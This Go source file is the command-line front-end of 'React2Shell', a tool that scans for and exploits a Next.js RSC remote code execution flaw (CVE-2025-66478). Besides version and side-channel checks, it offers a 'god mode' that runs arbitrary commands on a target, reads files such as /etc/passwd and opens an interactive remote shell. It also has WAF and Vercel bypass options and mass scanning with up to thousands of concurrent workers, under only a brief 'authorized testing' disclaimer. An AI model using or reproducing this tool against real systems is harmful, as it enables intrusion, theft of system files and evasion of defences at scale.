package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/react2shell/scanner/internal/client"
	"github.com/react2shell/scanner/internal/local"
	"github.com/react2shell/scanner/internal/output"
	"github.com/react2shell/scanner/internal/scanner"
	shellpkg "github.com/react2shell/scanner/internal/shell"
	"github.com/react2shell/scanner/pkg/models"
)

const (
	version        = "1.1.0"
	toolName       = "React2Shell Ultimate CVE-2025-66478 Scanner"
	defaultUA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	defaultWorkers = 1000
)

func main() {
	if len(os.Args) == 1 {
		showHelp()
		os.Exit(0)
	}

	var (
		urlFlag           = flag.String("u", "", "Single URL to scan")
		listFlag          = flag.String("l", "", "File with URLs (one per line)")
		localFlag         = flag.String("local", "", "Scan local project directory")
		safeFlag          = flag.Bool("safe", false, "Safe side-channel detection (no code execution)")
		rceFlag           = flag.Bool("rce", false, "RCE proof-of-concept (executes echo calculation)")
		versionFlag       = flag.Bool("version", false, "Version detection only (HTTP headers)")
		comprehensiveFlag = flag.Bool("comprehensive", false, "Full scan: version + safe + RCE with bypasses")
		wafBypassFlag     = flag.Bool("waf-bypass", false, "Add junk data to bypass WAF inspection")
		wafBypassSize     = flag.Int("waf-bypass-size", 128, "Junk data size in KB (default: 128)")
		unicodeFlag       = flag.Bool("unicode", false, "Use Unicode encoding for WAF bypass")
		vercelBypassFlag  = flag.Bool("vercel-bypass", false, "Use Vercel-specific WAF bypass")
		windowsFlag       = flag.Bool("windows", false, "Use Windows PowerShell payload")
		godFlag           = flag.Bool("god", false, "Enable god mode for actual command execution (authorized red team only)")
		cmdFlag           = flag.String("cmd", "", "Command to execute in god mode (e.g., --cmd 'id')")
		readFileFlag      = flag.String("read-file", "", "File to read from target in god mode (e.g., --read-file '/etc/passwd')")
		shellFlag         = flag.Bool("shell", false, "Interactive shell on vulnerable target (god mode)")
		workersFlag       = flag.Int("workers", defaultWorkers, "Number of concurrent workers (default: 1000)")
		timeoutFlag       = flag.Int("timeout", 10, "Request timeout in seconds (default: 10)")
		insecureFlag      = flag.Bool("k", true, "Disable SSL verification (default: enabled)")
		proxyFlag         = flag.String("proxy", "", "Proxy URL (http://host:port)")
		outputFlag        = flag.String("o", "", "Output file (JSON)")
		allResultsFlag    = flag.Bool("all-results", false, "Save all results, not just vulnerable")
		verboseFlag       = flag.Bool("v", false, "Verbose output")
		quietFlag         = flag.Bool("q", false, "Only show vulnerable hosts")
		noColorFlag       = flag.Bool("no-color", false, "Disable colored output")
		jsonFlag          = flag.Bool("json", false, "Output results as JSON to stdout")
	)

	flag.Parse()

	if *godFlag {
		handleGodMode(*urlFlag, *cmdFlag, *readFileFlag, *shellFlag, *windowsFlag,
			*wafBypassFlag, *wafBypassSize, *unicodeFlag, *timeoutFlag, *insecureFlag, *proxyFlag)
		return
	}

	if *localFlag != "" {
		handleLocalScan(*localFlag, *quietFlag, *verboseFlag, *jsonFlag, *noColorFlag, *outputFlag, *allResultsFlag)
		return
	}

	var hosts []string
	if *urlFlag != "" {
		hosts = []string{*urlFlag}
	} else if *listFlag != "" {
		var err error
		hosts, err = readHostsFromFile(*listFlag)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[ERROR] Failed to read file: %v\n", err)
			os.Exit(1)
		}
	} else {
		fmt.Fprintf(os.Stderr, "[ERROR] Must specify -u, -l, or --local\n")
		os.Exit(1)
	}

	if len(hosts) == 0 {
		fmt.Fprintf(os.Stderr, "[ERROR] No hosts to scan\n")
		os.Exit(1)
	}

	scanMode := determineScanMode(*versionFlag, *safeFlag, *rceFlag, *comprehensiveFlag)
	opts := &models.ScanOptions{
		Windows:         *windowsFlag,
		WAFBypass:       *wafBypassFlag,
		WAFBypassSizeKB: *wafBypassSize,
		UnicodeEncode:   *unicodeFlag,
		VercelBypass:    *vercelBypassFlag,
		Timeout:         *timeoutFlag,
		VerifySSL:       !*insecureFlag,
		Proxy:           *proxyFlag,
		UserAgent:       defaultUA,
	}

	handleRemoteScan(hosts, scanMode, opts, *workersFlag, *quietFlag, *verboseFlag,
		*jsonFlag, *noColorFlag, *outputFlag, *allResultsFlag)
}

func handleGodMode(url, cmd, readFile string, shell, windows, wafBypass bool,
	wafBypassSize int, unicode bool, timeout int, insecure bool, proxy string) {

	if url == "" {
		fmt.Fprintf(os.Stderr, "[ERROR] God mode requires a single URL target (-u/--url)\n")
		os.Exit(1)
	}

	if cmd == "" && readFile == "" && !shell {
		fmt.Fprintf(os.Stderr, "[!] God mode requires one of: --cmd, --read-file, or --shell\n")
		fmt.Fprintf(os.Stderr, "    Example: --god -u https://target.com --cmd 'id'\n")
		fmt.Fprintf(os.Stderr, "    Example: --god -u https://target.com --read-file '/etc/passwd'\n")
		fmt.Fprintf(os.Stderr, "    Example: --god -u https://target.com --shell\n")
		os.Exit(1)
	}

	httpClient := client.NewHTTPClient(timeout, !insecure, proxy)
	scnr := scanner.NewScanner(httpClient, defaultUA)
	opts := &models.ScanOptions{
		Windows:         windows,
		WAFBypass:       wafBypass,
		WAFBypassSizeKB: wafBypassSize,
		UnicodeEncode:   unicode,
		Timeout:         timeout,
		VerifySSL:       !insecure,
		Proxy:           proxy,
		UserAgent:       defaultUA,
	}

	ctx := context.Background()

	if shell {
		sh := shellpkg.NewShell(scnr, url, opts)
		if err := sh.Run(ctx); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		return
	}

	if cmd != "" {
		fmt.Printf("[*] Executing command: %s\n", cmd)
		fmt.Printf("[*] Target: %s\n", url)
		if wafBypass {
			fmt.Printf("[*] WAF Bypass: Enabled (%dKB junk data)\n", wafBypassSize)
		}
		if unicode {
			fmt.Println("[*] Unicode Encoding: Enabled")
		}
		fmt.Println()

		success, output, err := scnr.ExecuteCommand(ctx, url, cmd, opts)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		if success {
			fmt.Println("============================================================")
			fmt.Println("COMMAND OUTPUT")
			fmt.Println("============================================================")
			fmt.Println(output)
			fmt.Println("============================================================")
			fmt.Println("\n[✓] Command executed successfully!")
		} else {
			fmt.Printf("[✗] Command execution failed: %s\n", output)
		}
		return
	}

	if readFile != "" {
		fmt.Printf("[*] Reading file: %s\n", readFile)
		fmt.Printf("[*] Target: %s\n", url)
		fmt.Println()

		success, content, err := scnr.ReadFile(ctx, url, readFile, opts)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		if success {
			fmt.Println("============================================================")
			fmt.Printf("FILE: %s\n", readFile)
			fmt.Println("============================================================")
			fmt.Println(content)
			fmt.Println("============================================================")
			fmt.Printf("\n[✓] File read successfully! (%d bytes)\n", len(content))
		} else {
			fmt.Printf("[✗] File read failed: %s\n", content)
		}
		return
	}
}

func handleLocalScan(path string, quiet, verbose, jsonOutput, noColor bool, outputFile string, allResults bool) {
	if !quiet {
		fmt.Printf("[*] Scanning local project: %s\n", path)
	}

	results, err := local.ScanLocalProject(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to scan: %v\n", err)
		os.Exit(1)
	}

	var formatter output.Formatter
	if jsonOutput {
		formatter = output.NewJSONFormatter()
	} else {
		formatter = output.NewConsoleFormatter(verbose, !noColor)
	}

	var vulnerableCount int
	for _, result := range results {
		if result.Vulnerable != nil && *result.Vulnerable {
			vulnerableCount++
		}
		if !quiet || (result.Vulnerable != nil && *result.Vulnerable) {
			formatter.Format(result, os.Stdout)
		}
	}

	if outputFile != "" {
		saveResults(results, outputFile, !allResults)
	}

	if !quiet && !jsonOutput {
		color := "\033[92m"
		if vulnerableCount > 0 {
			color = "\033[91m"
		}
		if !noColor {
			fmt.Printf("\n[*] Found %d Next.js projects, %s%d%s vulnerable\n",
				len(results), color, vulnerableCount, "\033[0m")
		} else {
			fmt.Printf("\n[*] Found %d Next.js projects, %d vulnerable\n",
				len(results), vulnerableCount)
		}
	}

	os.Exit(1)
}

func handleRemoteScan(hosts []string, scanMode models.ScanMode, opts *models.ScanOptions,
	workers int, quiet, verbose, jsonOutput, noColor bool, outputFile string, allResults bool) {

	if !quiet {
		fmt.Printf("[*] Scanning %d host(s)\n", len(hosts))
		fmt.Printf("[*] Workers: %d, Timeout: %ds\n", workers, opts.Timeout)
	}

	httpClient := client.NewHTTPClient(opts.Timeout, opts.VerifySSL, opts.Proxy)
	scnr := scanner.NewScanner(httpClient, opts.UserAgent)

	var results []*models.ScanResult
	var vulnerableCount, errorCount int

	if len(hosts) == 1 {
		result, err := scanSingleHost(context.Background(), scnr, hosts[0], scanMode, opts)
		if err != nil {
			result = &models.ScanResult{
				URL:   hosts[0],
				Error: err.Error(),
			}
			errorCount++
		}
		results = append(results, result)

		if result.Vulnerable != nil && *result.Vulnerable {
			vulnerableCount++
		}
	} else {
		pool := scanner.NewWorkerPool(scnr, workers)
		pool.Start()
		defer pool.Close()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		go func() {
			for _, host := range hosts {
				job := scanner.Job{
					URL:     host,
					Options: opts,
					Mode:    scanMode,
				}
				if err := pool.Submit(job); err != nil {
					break
				}
			}
		}()

		results = make([]*models.ScanResult, 0, len(hosts))
		resultChan := pool.Results()

		for i := 0; i < len(hosts); i++ {
			select {
			case result, ok := <-resultChan:
				if !ok {
					goto done
				}
				if result.Error != nil {
					errorCount++
					results = append(results, &models.ScanResult{
						URL:   hosts[i],
						Error: result.Error.Error(),
					})
				} else {
					results = append(results, result.ScanResult)
					if result.ScanResult.Vulnerable != nil && *result.ScanResult.Vulnerable {
						vulnerableCount++
					}
				}
			case <-ctx.Done():
				goto done
			}
		}
	done:
	}

	var formatter output.Formatter
	if jsonOutput {
		formatter = output.NewJSONFormatter()
		formatter.FormatBatch(results, os.Stdout)
	} else {
		formatter = output.NewConsoleFormatter(verbose, !noColor)
		for _, result := range results {
			if !quiet || (result.Vulnerable != nil && *result.Vulnerable) {
				formatter.Format(result, os.Stdout)
			}
		}
	}

	if !quiet && !jsonOutput {
		printSummary(len(hosts), vulnerableCount, errorCount, !noColor)
	}

	if outputFile != "" {
		saveResults(results, outputFile, !allResults)
	}

	if vulnerableCount > 0 {
		os.Exit(1)
	}
	os.Exit(0)
}

func scanSingleHost(ctx context.Context, scnr scanner.Scanner, url string,
	mode models.ScanMode, opts *models.ScanOptions) (*models.ScanResult, error) {

	switch mode {
	case models.ModeVersion:
		return scnr.ScanVersion(ctx, url)
	case models.ModeSafe:
		result, err := scnr.ScanSafe(ctx, url)
		if err != nil {
			return result, err
		}
		versionResult, _ := scnr.ScanVersion(ctx, url)
		result.Version = versionResult.Version
		return result, nil
	case models.ModeRCE:
		result, err := scnr.ScanRCE(ctx, url, opts)
		if err != nil {
			return result, err
		}
		versionResult, _ := scnr.ScanVersion(ctx, url)
		result.Version = versionResult.Version
		return result, nil
	default:
		return scnr.ScanComprehensive(ctx, url, opts)
	}
}

func determineScanMode(version, safe, rce, comprehensive bool) models.ScanMode {
	if version {
		return models.ModeVersion
	}
	if safe {
		return models.ModeSafe
	}
	if rce {
		return models.ModeRCE
	}
	return models.ModeComprehensive
}

func readHostsFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var hosts []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			hosts = append(hosts, line)
		}
	}

	return hosts, scanner.Err()
}

func saveResults(results []*models.ScanResult, filename string, vulnerableOnly bool) {
	var toSave []*models.ScanResult
	if vulnerableOnly {
		for _, r := range results {
			if r.Vulnerable != nil && *r.Vulnerable {
				toSave = append(toSave, r)
			}
		}
	} else {
		toSave = results
	}

	file, err := os.Create(filename)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to create output file: %v\n", err)
		return
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	if err := encoder.Encode(toSave); err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to write results: %v\n", err)
		return
	}

	fmt.Printf("\n[+] Results saved to: %s\n", filename)
}

func printSummary(total, vulnerable, errors int, color bool) {
	fmt.Println("============================================================")
	fmt.Println("SCAN SUMMARY")
	fmt.Println("============================================================")
	fmt.Printf("  Total hosts: %d\n", total)

	if color {
		if vulnerable > 0 {
			fmt.Printf("  \033[91m\033[1mVulnerable: %d\033[0m\n", vulnerable)
		} else {
			fmt.Printf("  \033[92mVulnerable: %d\033[0m\n", vulnerable)
		}
	} else {
		fmt.Printf("  Vulnerable: %d\n", vulnerable)
	}

	fmt.Printf("  Not vulnerable: %d\n", total-vulnerable-errors)
	fmt.Printf("  Errors: %d\n", errors)
	fmt.Println("============================================================")
}

func showHelp() {
	fmt.Printf(`
╔════════════════════════════════════════════════════════════════════════╗
║     ____                 _   ___  ____  _          _ _                 ║
║    |  _ \\ ___  __ _  ___| |_|__ \\/ ___|| |__   ___| | |                ║
║    | |_) / _ \\/ _' |/ __| __| / /\\___ \\| '_ \\ / _ \\ | |                ║
║    |  _ <  __/ (_| | (__| |_ / /_ ___) | | | |  __/ | |                ║
║    |_| \\_\\___|\\__,_|\\___|\\__|____|____/|_| |_|\\___|_|_|                ║
║                                                                        ║
║            React2Shell Ultimate CVE-2025-66478 Scanner v%s         ║
║          Next.js RSC Remote Code Execution Vulnerability               ║
╠════════════════════════════════════════════════════════════════════════╣
║  Go Implementation: Adedamola Adeyemo (@megactek)                     ║
║  https://github.com/megactek                                           ║
║                                                                        ║
║  Original Python Version: Satyam Rastogi (@hackersatyamrastogi)        ║
║  https://github.com/hackersatyamrastogi                                ║
╚════════════════════════════════════════════════════════════════════════╝

USAGE:
    scanner [OPTIONS] <TARGET>

QUICK START EXAMPLES:
┌─────────────────────────────────────────────────────────────────────────┐
│ # Scan a single URL (comprehensive mode)                                │
│   scanner -u https://target.com                                         │
│                                                                         │
│ # Safe scan (no code execution)                                        │
│   scanner -u https://target.com --safe                                  │
│                                                                         │
│ # RCE proof-of-concept                                                  │
│   scanner -u https://target.com --rce                                    │
│                                                                         │
│ # Scan multiple targets from file                                       │
│   scanner -l targets.txt --workers 2000                                 │
│                                                                         │
│ # Scan local Next.js projects                                           │
│   scanner --local /path/to/projects                                     │
│                                                                         │
│ # With WAF bypass                                                       │
│   scanner -u https://target.com --rce --waf-bypass                      │
└─────────────────────────────────────────────────────────────────────────┘

SCAN MODES:
    --safe           Safe side-channel detection (no code execution)
    --rce            RCE proof-of-concept (executes: echo $((41*271)))
    --version        Version detection only (fastest)
    --comprehensive  Full scan with all techniques (default)

WAF BYPASS:
    --waf-bypass     Add 128KB junk data to bypass content inspection
    --unicode        Unicode encoding bypass
    --vercel-bypass  Vercel-specific WAF bypass

GOD MODE (Red Team):
    --god            Enable god mode for command execution
    --cmd 'cmd'      Execute single command (e.g., --cmd 'id')
    --read-file      Read file from target (e.g., --read-file '/etc/passwd')
    --shell          Interactive shell on vulnerable target

For full options, run: scanner --help

⚠️  DISCLAIMER: For authorized security testing only.
`, version)
}
